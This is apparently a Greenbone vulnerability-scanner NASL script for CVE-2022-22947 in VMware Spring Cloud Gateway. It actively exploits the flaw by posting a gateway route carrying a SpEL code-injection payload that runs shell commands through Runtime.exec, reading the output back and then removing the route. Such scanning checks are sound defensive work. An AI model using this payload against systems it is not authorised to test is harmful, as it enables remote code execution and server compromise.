# Copyright (C) 2022 Greenbone Networks GmbH
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-or-later
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.

CPE = "cpe:/a:vmware:spring_cloud_gateway";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.147770");
  script_version("2022-03-08T12:20:13+0000");
  script_tag(name:"last_modification", value:"2022-03-09 11:12:38 +0000 (Wed, 09 Mar 2022)");
  script_tag(name:"creation_date", value:"2022-03-08 04:33:13 +0000 (Tue, 08 Mar 2022)");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");

  script_cve_id("CVE-2022-22947");

  script_tag(name:"qod_type", value:"exploit");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("VMware Spring Cloud Gateway < 3.0.7, 3.1.x < 3.1.1 RCE Vulnerability - Active Check");

  script_category(ACT_GATHER_INFO);

  script_copyright("Copyright (C) 2022 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_vmware_spring_cloud_gateway_http_detect.nasl", "os_detection.nasl");
  script_mandatory_keys("vmware/spring/cloud/gateway/http/detected");
  script_require_ports("Services/www", 80);

  script_tag(name:"summary", value:"VMware Spring Cloud Gateway is prone to a remote code execution
  (RCE) vulnerability.");

  script_tag(name:"vuldetect", value:"Sends multiple HTTP POST and GET requests and checks the
  responses.");

  script_tag(name:"insight", value:"Applications using Spring Cloud Gateway are vulnerable to a code
  injection attack when the Gateway Actuator endpoint is enabled, exposed and unsecured. A remote
  attacker could make a maliciously crafted request that could allow arbitrary remote execution on
  the remote host.");

  script_tag(name:"affected", value:"VMware Spring Cloud Gateway version 3.0.6 and prior and version
  3.1.0.");

  script_tag(name:"solution", value:"Update to version 3.0.7, 3.1.1 or later.");

  script_xref(name:"URL", value:"https://tanzu.vmware.com/security/cve-2022-22947");
  script_xref(name:"URL", value:"https://github.com/vulhub/vulhub/tree/master/spring/CVE-2022-22947");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");
include("os_func.inc");

if (!port = get_app_port(cpe: CPE, service: "www"))
  exit(0);

if (!dir = get_app_location(cpe: CPE, port: port))
  exit(0);

if (dir == "/")
  dir = "";

cmds = exploit_commands();

vt_strings = get_vt_strings();
name = vt_strings["default_rand"];

foreach pattern (keys(cmds)) {
  url = dir + "/actuator/gateway/routes/" + name;

  headers = make_array("Content-Type", "application/json");

  data = '{"id":"' + name + '","filters":[{"name":"AddResponseHeader","args":{"name": "Result",' +
         '"value":"#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\\"' + cmds[pattern] + '\\"}).getInputStream()))}"' +
         '}}],"uri": "http://example.com","order":0}';

  req = http_post_put_req(port: port, url: url, data: data, add_headers: headers);
  res = http_keepalive_send_recv(port: port, data: req);

  if (res !~ "^HTTP/1\.[01] 201")
    exit(0);

  url = dir + "/actuator/gateway/refresh";

  headers = make_array("Content-Type", "application/x-www-form-urlencoded");

  data = "";

  req = http_post_put_req(port: port, url: url, data: data, add_headers: headers);
  res = http_keepalive_send_recv(port: port, data: req);

  if (res !~ "^HTTP/1\.[01] 200")
    exit(0);

  url = dir + "/actuator/gateway/routes/" + name;

  req = http_get(port: port, item: url);
  res = http_keepalive_send_recv(port: port, data: req, bodyonly: TRUE);

  if (egrep(pattern: pattern, string: res)) {
    report = 'It was possible to execute the "' + cmds[pattern] + '" command.\n\nResult:\n\n' + res;
    security_message(port: port, data: report);

    url = dir + "/actuator/gateway/routes/" + name;

    req = http_get(port: port, item: url);
    # Send a DELETE request instead of a GET request
    req = ereg_replace(pattern: "^GET", replace: "DELETE", string: req);
    http_keepalive_send_recv(port: port, data: req);

    url = dir + "/actuator/gateway/refresh";

    headers = make_array("Content-Type", "application/x-www-form-urlencoded");

    data = "";

    req = http_post_put_req(port: port, url: url, data: data, add_headers: headers);
    http_keepalive_send_recv(port: port, data: req);

    exit(0);
  }
}

exit(99);
